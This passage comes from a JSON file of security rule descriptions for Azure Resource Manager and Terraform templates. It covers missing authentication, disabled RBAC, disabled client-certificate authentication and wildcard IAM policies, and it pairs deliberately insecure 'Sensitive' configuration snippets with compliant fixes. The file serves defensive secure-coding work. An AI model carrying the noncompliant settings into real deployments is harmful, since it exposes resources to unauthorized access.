\"2022-09-01-preview\",\n                    \"name\": \"exampleApi\",\n                    \"properties\": {\n                        \"authenticationSettings\": {\n                            \"openid\": {\n                                \"bearerTokenSendingMethods\": [\"authorizationHeader\"],\n                                \"openidProviderId\": \"&lt;an OpenID provider ID&gt;\"\n                            }\n                        }\n                    }\n                }\n            ]\n        }\n    ]\n}\n</pre>\n<pre data-diff-id=\"102\" data-diff-type=\"compliant\">\nresource apiManagementService 'Microsoft.ApiManagement/service@2022-09-01-preview' = {\n    name: 'example'\n\n    resource portalSettings 'portalsettings@2022-09-01-preview' = {\n        name: 'signin'\n        properties: {\n            enabled: true // Compliant: Sign-in is enabled for portal access\n        }\n    }\n\n    resource apis 'apis@2022-09-01-preview' = {\n        name: 'exampleApi'\n        properties: {\n            path: '/test'\n            authenticationSettings: { // Compliant: API has authentication enabled\n                openid: {\n                    bearerTokenSendingMethods: ['authorizationHeader']\n                    openidProviderId: '&lt;an OpenID provider ID&gt;'\n                }\n            }\n        }\n    }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/data-factory/\">Data Factory</a> Linked Services:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\n{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.DataFactory/factories/linkedservices\",\n            \"apiVersion\": \"2018-06-01\",\n            \"name\": \"example\",\n            \"properties\": {\n                \"type\": \"Web\",\n                \"typeProperties\": {\n                    \"authenticationType\": \"Basic\"\n                }\n            }\n        }\n    ]\n}\n</pre>\n<pre data-diff-id=\"103\" data-diff-type=\"compliant\">\n@secure()\n@description('The password for authentication')\nparam password string\n\nresource linkedService 'Microsoft.DataFactory/factories/linkedservices@2018-06-01' = {\n    name: 'example'\n    properties: {\n        type: 'Web'\n        typeProperties: {\n            authenticationType: 'Basic' // Compliant\n            username: 'test'\n            password: {\n                type: 'SecureString'\n                value: password\n            }\n        }\n    }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/product-categories/storage/\">Storage Accounts</a>:</p>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\n{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.Storage/storageAccounts\",\n            \"apiVersion\": \"2022-09-01\",\n            \"name\": \"example\",\n            \"properties\": {\n                \"allowBlobPublicAccess\": false\n            }\n        }\n    ]\n}\n</pre>\n<pre data-diff-id=\"104\" data-diff-type=\"compliant\">\nresource storageAccount 'Microsoft.Storage/storageAccounts@2022-09-01' = {\n  name: 'example'\n  properties: {\n    allowBlobPublicAccess: false // Compliant\n  }\n}\n</pre>\n<pre data-diff-id=\"5\" data-diff-type=\"compliant\">\n{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.Storage/storageAccounts\",\n            \"apiVersion\": \"2022-09-01\",\n            \"name\": \"example\",\n            \"resources\": [\n                {\n                    \"type\": \"blobServices/containers\",\n                    \"apiVersion\": \"2022-09-01\",\n                    \"name\": \"blobContainerExample\",\n                    \"properties\": {\n                        \"publicAccess\": \"None\"\n                    }\n                }\n            ]\n        }\n    ]\n}\n</pre>\n<pre data-diff-id=\"105\" data-diff-type=\"compliant\">\nresource storageAccount 'Microsoft.Storage/storageAccounts@2022-09-01' = {\n    name: 'example'\n\n    resource blobService 'blobServices@2022-09-01' = {\n        name: 'default'\n\n        resource containers 'containers@2022-09-01' = {\n            name: 'exampleContainer'\n            properties: {\n                publicAccess: 'None' // Compliant\n            }\n        }\n    }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/cache/\">Redis Caches</a>:</p>\n<pre data-diff-id=\"6\" data-diff-type=\"compliant\">\n{\n    \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n    \"contentVersion\": \"1.0.0.0\",\n    \"resources\": [\n        {\n            \"type\": \"Microsoft.Cache/redis\",\n            \"apiVersion\": \"2022-06-01\",\n            \"name\": \"example\",\n            \"properties\": {\n                \"redisConfiguration\": {}\n            }\n        }\n    ]\n}\n</pre>\n<pre data-diff-id=\"106\" data-diff-type=\"compliant\">\nresource redisCache 'Microsoft.Cache/redis@2023-04-01' = {\n    name: 'example'\n    location: location\n    properties: {\n        redisConfiguration: {\n            // Compliant: authentication is enabled by default\n        }\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "azureresourcemanager:S6383": {
        "name": "Disabling Role-Based Access Control on Azure resources is security-sensitive",
        "htmlDesc": "<p>Disabling Role-Based Access Control (RBAC) on Azure resources can reduce an organization’s ability to protect itself against access controls being\ncompromised.</p>\n<p>To be considered safe, access controls must follow the principle of least privilege and correctly segregate duties amongst users. RBAC helps\nenforce these practices by adapting the organization’s access control needs into explicit role-based policies: It helps keeping access controls\nmaintainable and sustainable.</p>\n<p>Furthermore, RBAC allows operations teams to work faster during a security incident. It helps to mitigate account theft or intrusions by quickly\nshutting down accesses.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This Azure resource is essential for the information system infrastructure. </li>\n  <li> This Azure resource is essential for mission-critical functions. </li>\n  <li> Compliance policies require access to this resource to be enforced through the use of Role-Based Access Control. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Enable Azure RBAC when the Azure resource supports it. </li>\n  <li> For Kubernetes clusters, enable Azure RBAC if Azure AD integration is supported. Otherwise, use the built-in Kubernetes RBAC. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.containerservice/2023-03-01/managedclusters?pivots=deployment-language-arm-template\">AKS\nAzure Kubernetes Service</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.ContainerService/managedClusters\",\n      \"apiVersion\": \"2023-03-01\",\n      \"properties\": {\n        \"aadProfile\": {\n          \"enableAzureRBAC\": false\n        },\n        \"enableRBAC\": false\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nresource aks 'Microsoft.ContainerService/managedClusters@2023-03-01' = {\n  properties: {\n    aadProfile: {\n      enableAzureRBAC: false    // Sensitive\n    }\n    enableRBAC: false           // Sensitive\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.keyvault/2022-07-01/vaults?pivots=deployment-language-arm-template\">Key\nVault</a>:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.KeyVault/vaults\",\n      \"apiVersion\": \"2022-07-01\",\n      \"properties\": {\n        \"enableRbacAuthorization\": false\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\nresource keyVault 'Microsoft.KeyVault/vaults@2022-07-01' = {\n  properties: {\n    enableRbacAuthorization: false    // Sensitive\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.containerservice/2023-03-01/managedclusters?pivots=deployment-language-arm-template\">AKS\nAzure Kubernetes Service</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.ContainerService/managedClusters\",\n      \"apiVersion\": \"2023-03-01\",\n      \"properties\": {\n        \"aadProfile\": {\n          \"enableAzureRBAC\": true\n        },\n        \"enableRBAC\": true\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nresource aks 'Microsoft.ContainerService/managedClusters@2023-03-01' = {\n  properties: {\n    aadProfile: {\n      enableAzureRBAC: true     // Compliant\n    }\n    enableRBAC: true            // Compliant\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.keyvault/2022-07-01/vaults?pivots=deployment-language-arm-template\">Key\nVault</a>:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.KeyVault/vaults\",\n      \"apiVersion\": \"2022-07-01\",\n      \"properties\": {\n        \"enableRbacAuthorization\": true\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\nresource keyVault 'Microsoft.KeyVault/vaults@2022-07-01' = {\n  properties: {\n    enableRbacAuthorization: true    // Compliant\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "azureresourcemanager:S6382": {
        "name": "Disabling certificate-based authentication is security-sensitive",
        "htmlDesc": "<p>Disabling certificate-based authentication can reduce an organization’s ability to react against attacks on its critical functions and data.</p>\n<p>Azure offers various authentication options to access resources: Anonymous connections, Basic authentication, password-based authentication, and\ncertificate-based authentication.</p>\n<p>Choosing certificate-based authentication helps bring client/host trust by allowing the host to verify the client and vice versa. It cannot be\nforged or forwarded by a man-in-the-middle eavesdropper, and the certificate’s private key is never sent over the network so it’s harder to steal than\na password.</p>\n<p>In case of a security incident, certificates help bring investigators traceability and allow security operations teams to react faster. For\nexample, all compromised certificates could be revoked individually, or an issuing certificate could be revoked which causes all the certificates it\nissued to become untrusted.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This Azure resource is essential for the information system infrastructure. </li>\n  <li> This Azure resource is essential for mission-critical functions. </li>\n  <li> Compliance policies require access to this resource to be authenticated with certificates. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Enable certificate-based authentication.</p>\n<h2>Sensitive Code Example</h2>\n<p>Where the use of client certificates is controlled by a boolean value, such as:</p>\n<ul>\n  <li> <code>Microsoft.Web/sites</code> with <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites?pivots=deployment-language-arm-template#siteproperties\">clientCertEnabled</a> </li>\n  <li> <code>Microsoft.SignalRService/signalR</code> with <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.signalrservice/signalr?pivots=deployment-language-arm-template#signalrtlssettings\">tls → clientCertEnabled</a> </li>\n  <li> <code>Microsoft.SignalRService/webPubSub</code> with <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.signalrservice/webpubsub?pivots=deployment-language-arm-template#webpubsubtlssettings-1\">tls → clientCertEnabled</a> </li>\n  <li> <code>Microsoft.ApiManagement/service/gateways/hostnameConfigurations</code> with <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.apimanagement/service/gateways/hostnameconfigurations?pivots=deployment-language-arm-template#gatewayhostnameconfigurationcontractproperties\">negotiateClientCertificate</a> </li>\n</ul>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.SignalRService/webPubSub\",\n      \"apiVersion\": \"2020-07-01-preview\",\n      \"name\": \"example\",\n      \"properties\": {\n        \"tls\": {\n          \"clientCertEnabled\": false\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nresource example 'Microsoft.SignalRService/webPubSub@2020-07-01-preview' = {\n  name: 'example'\n  properties: {\n    tls: {\n      clientCertEnabled: false // Sensitive\n    }\n  }\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Web/sites\",\n      \"apiVersion\": \"2015-08-01\",\n      \"name\": \"example\",\n      \"properties\": {\n        \"clientCertEnabled\": false\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"12\" data-diff-type=\"noncompliant\">\nresource example 'Microsoft.Web/sites@2015-08-01' = {\n  name: 'example'\n  properties: {\n    clientCertEnabled: false // Sensitive\n  }\n}\n</pre>\n<p>Where the use of client certificates can be made optional, such as:</p>\n<ul>\n  <li> <code>Microsoft.Web/sites</code> with <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites?pivots=deployment-language-arm-template#siteproperties\">clientCertMode</a> </li>\n  <li> <code>Microsoft.App/containerApps</code> with <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.app/containerapps?pivots=deployment-language-arm-template#ingress\">configuration →\n  ingress → clientCertificateMode</a> </li>\n</ul>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Web/sites\",\n      \"apiVersion\": \"2015-08-01\",\n      \"name\": \"example\",\n      \"properties\": {\n        \"clientCertEnabled\": true,\n        \"clientCertMode\": \"Optional\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"13\" data-diff-type=\"noncompliant\">\nresource example 'Microsoft.Web/sites@2015-08-01' = {\n  name: 'example'\n  properties: {\n    clientCertEnabled: true\n    clientCertMode: 'Optional' // Sensitive\n  }\n}\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.App/containerApps\",\n      \"apiVersion\": \"2022-10-01\",\n      \"name\": \"example\",\n      \"properties\": {\n        \"configuration\": {\n          \"ingress\": {\n            \"clientCertificateMode\": \"accept\"\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"14\" data-diff-type=\"noncompliant\">\nresource example 'Microsoft.App/containerApps@2022-10-01' = {\n  name: 'example'\n  properties: {\n    configuration: {\n      ingress: {\n        clientCertificateMode: 'accept' // Sensitive\n      }\n    }\n  }\n}\n</pre>\n<p>Where client certificates can be used to authenticate outbound requests, such as:</p>\n<ul>\n  <li> <code>Microsoft.DataFactory/factories/linkedservices</code> with <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.datafactory/factories/linkedservices?pivots=deployment-language-arm-template#httplinkedservicetypeproperties\">typeProperties → authenticationType</a> where the request type is <code>Web</code> or <code>HttpServer</code> </li>\n  <li> <code>Microsoft.DataFactory/factories/pipelines</code> with <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.datafactory/factories/pipelines?pivots=deployment-language-arm-template#webactivityauthentication\">activites → typeProperties → authentication → type</a> where the activity type is <code>WebActivity</code> or <code>WebHook</code> </li>\n  <li> <code>Microsoft.Scheduler/jobCollections/jobs</code> with <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.scheduler/jobcollections/jobs?pivots=deployment-language-arm-template#httprequest-1\">action → request → authentication → type</a> </li>\n  <li> <code>Microsoft.Scheduler/jobCollections/jobs</code> with <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.scheduler/jobcollections/jobs?pivots=deployment-language-arm-template#joberroraction-1\">action → errorAction → request → authentication → type</a> </li>\n</ul>\n<pre data-diff-id=\"5\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.DataFactory/factories/linkedservices\",\n      \"apiVersion\": \"2018-06-01\",\n      \"name\": \"factories/example\",\n      \"properties\": {\n        \"type\": \"Web\",\n        \"typeProperties\": {\n          \"authenticationType\": \"Basic\"\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"15\" data-diff-type=\"noncompliant\">\nresource example 'Microsoft.DataFactory/factories/linkedservices@2018-06-01' = {\n  name: 'example'\n  properties: {\n    type: 'Web'\n    typeProperties: {\n      authenticationType: 'Basic' // Sensitive\n    }\n  }\n}\n</pre>\n<p>Where a list of permitted client certificates must be provided, such as:</p>\n<ul>\n  <li> <code>Microsoft.DocumentDB/cassandraClusters</code> with <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.documentdb/cassandraclusters?pivots=deployment-language-arm-template#clusterresourceproperties-1\">clientCertificates</a> </li>\n  <li> <code>Microsoft.Network/applicationGateways</code> with <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.network/applicationgateways?pivots=deployment-language-arm-template#applicationgatewaypropertiesformat-1\">trustedClientCertificates</a> </li>\n  <li> <code>Microsoft.ServiceFabric/clusters</code> with <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.servicefabric/clusters?pivots=deployment-language-arm-template#clusterproperties-1\">clientCertificateCommonNames</a> or <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.servicefabric/clusters?pivots=deployment-language-arm-template#clusterproperties-1\">clientCertificateThumbprints</a> </li>\n</ul>\n<pre data-diff-id=\"6\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.DocumentDB/cassandraClusters\",\n      \"apiVersion\": \"2021-10-15\",\n      \"name\": \"example\",\n      \"properties\": {\n        \"clientCertificates\": []\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"16\" data-diff-type=\"noncompliant\">\nresource example 'Microsoft.DocumentDB/cassandraClusters@2021-10-15' = {\n  name: 'example'\n  properties: {\n    clientCertificates: [] // Sensitive\n  }\n}\n</pre>\n<p>Where a resouce can use both certificate-based and password-based authentication, such as:</p>\n<ul>\n  <li> <code>Microsoft.ContainerRegistry/registries/tokens</code> with <a\n  href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.containerregistry/registries/tokens?pivots=deployment-language-arm-template#tokencredentialsproperties-1\">credentials → certficates</a> and <code>credentials</code> → <code>passwords</code> </li>\n</ul>\n<pre data-diff-id=\"7\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.ContainerRegistry/registries/tokens\",\n      \"apiVersion\": \"2022-12-01\",\n      \"name\": \"registries/example\",\n      \"properties\": {\n        \"credentials\": {\n          \"passwords\": [\n            {\n              \"name\": \"password1\"\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"17\" data-diff-type=\"noncompliant\">\nresource example 'Microsoft.ContainerRegistry/registries/tokens@2022-12-01' = {\n  name: 'example'\n  properties: {\n    credentials: {\n      passwords: [ // Sensitive\n        {\n          name: 'password1'\n        }\n      ]\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Where the use of client certificates is controlled by a boolean value:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.SignalRService/webPubSub\",\n      \"apiVersion\": \"2020-07-01-preview\",\n      \"name\": \"example\",\n      \"properties\": {\n        \"tls\": {\n          \"clientCertEnabled\": true\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nresource example 'Microsoft.SignalRService/webPubSub@2020-07-01-preview' = {\n  name: 'example'\n  properties: {\n    tls: {\n      clientCertEnabled: true\n    }\n  }\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Web/sites\",\n      \"apiVersion\": \"2015-08-01\",\n      \"name\": \"example\",\n      \"properties\": {\n        \"clientCertEnabled\": true,\n        \"clientCertMode\": \"Required\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"12\" data-diff-type=\"compliant\">\nresource example 'Microsoft.Web/sites@2015-08-01' = {\n  name: 'example'\n  properties: {\n    clientCertEnabled: true\n    clientCertMode: 'Required'\n  }\n}\n</pre>\n<p>Where the use of client certificates can be made optional:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Web/sites\",\n      \"apiVersion\": \"2015-08-01\",\n      \"name\": \"example\",\n      \"properties\": {\n        \"clientCertEnabled\": true,\n        \"clientCertMode\": \"Required\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"13\" data-diff-type=\"compliant\">\nresource example 'Microsoft.Web/sites@2015-08-01' = {\n  name: 'example'\n  properties: {\n    clientCertEnabled: true\n    clientCertMode: 'Required'\n  }\n}\n</pre>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.App/containerApps\",\n      \"apiVersion\": \"2022-10-01\",\n      \"name\": \"example\",\n      \"properties\": {\n        \"configuration\": {\n          \"ingress\": {\n            \"clientCertificateMode\": \"require\"\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"14\" data-diff-type=\"compliant\">\nresource example 'Microsoft.App/containerApps@2022-10-01' = {\n  name: 'example'\n  properties: {\n    configuration: {\n      ingress: {\n        clientCertificateMode: 'require'\n      }\n    }\n  }\n}\n</pre>\n<p>Where client certificates can be used to authenticate outbound requests:</p>\n<pre data-diff-id=\"5\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.DataFactory/factories/linkedservices\",\n      \"apiVersion\": \"2018-06-01\",\n      \"name\": \"example\",\n      \"properties\": {\n        \"type\": \"Web\",\n        \"typeProperties\": {\n          \"authenticationType\": \"ClientCertificate\"\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"15\" data-diff-type=\"compliant\">\nresource example 'Microsoft.DataFactory/factories/linkedservices@2018-06-01' = {\n  name: 'example'\n  properties: {\n    type: 'Web'\n    typeProperties: {\n      authenticationType: 'ClientCertificate'\n    }\n  }\n}\n</pre>\n<p>Where a list of permitted client certificates must be provided:</p>\n<pre data-diff-id=\"6\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.DocumentDB/cassandraClusters\",\n      \"apiVersion\": \"2021-10-15\",\n      \"name\": \"example\",\n      \"properties\": {\n        \"clientCertificates\": [\n          {\n            \"pem\": \"[base64-encoded certificate]\"\n          }\n        ]\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"16\" data-diff-type=\"compliant\">\nresource example 'Microsoft.DocumentDB/cassandraClusters@2021-10-15' = {\n  name: 'example'\n  properties: {\n    clientCertificates: [\n      {\n        pem: '[base64-encoded certificate]'\n      }\n    ]\n  }\n}\n</pre>\n<p>Where a resouce can use both certificate-based and password-based authentication:</p>\n<pre data-diff-id=\"7\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.ContainerRegistry/registries/tokens\",\n      \"apiVersion\": \"2022-12-01\",\n      \"name\": \"example\",\n      \"properties\": {\n        \"credentials\": {\n          \"certificates\": [\n            {\n              \"name\": \"certificate1\",\n              \"encodedPemCertificate\": \"[base64-encoded certificate]\"\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"17\" data-diff-type=\"compliant\">\nresource example 'Microsoft.ContainerRegistry/registries/tokens@2022-12-01' = {\n  name: 'example'\n  properties: {\n    credentials: {\n      certificates: [\n        {\n          name: 'certificate1'\n          encodedPemCertificate: '[base64-encoded certificate]'\n        }\n      ]\n    }\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/azure/templates/\">Azure Resource Manager templates</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6304": {
        "name": "Policies granting access to all resources of an account are security-sensitive",
        "htmlDesc": "<p>A policy that allows identities to access all resources in an AWS account may violate <a\nhref=\"https://en.wikipedia.org/wiki/Principle_of_least_privilege\">the principle of least privilege</a>. Suppose an identity has permission to access\nall resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive\ninformation will occur.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The AWS account has more than one resource with different levels of sensitivity.</p>\n<p>A risk exists if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is\nto organize or <a\nhref=\"https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/\">tag</a>\nresources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>\n<h2>Sensitive Code Example</h2>\n<p>Update permission is granted for all policies using the wildcard (*) in the <code>Resource</code> property:</p>\n<pre>\nresource \"aws_iam_policy\" \"noncompliantpolicy\" {\n  name        = \"noncompliantpolicy\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = [\n          \"iam:CreatePolicyVersion\"\n        ]\n        Effect   = \"Allow\"\n        Resource = [\n          \"*\" # Sensitive\n        ]\n      }\n    ]\n  })\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Restrict update permission to the appropriate subset of policies:</p>\n<pre>\nresource \"aws_iam_policy\" \"compliantpolicy\" {\n  name        = \"compliantpolicy\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = [\n          \"iam:CreatePolicyVersion\"\n        ]\n        Effect   = \"Allow\"\n        Resource = [\n          \"arn:aws:iam::${data.aws_caller_identity.current.account_id}:policy/team1/*\"\n        ]\n      }\n    ]\n  })\n}\n</pre>\n<h2>Exceptions</h2>\n<ul>\n  <li> Should not be raised on key policies (when AWS KMS actions are used.) </li>\n  <li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "terraform:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
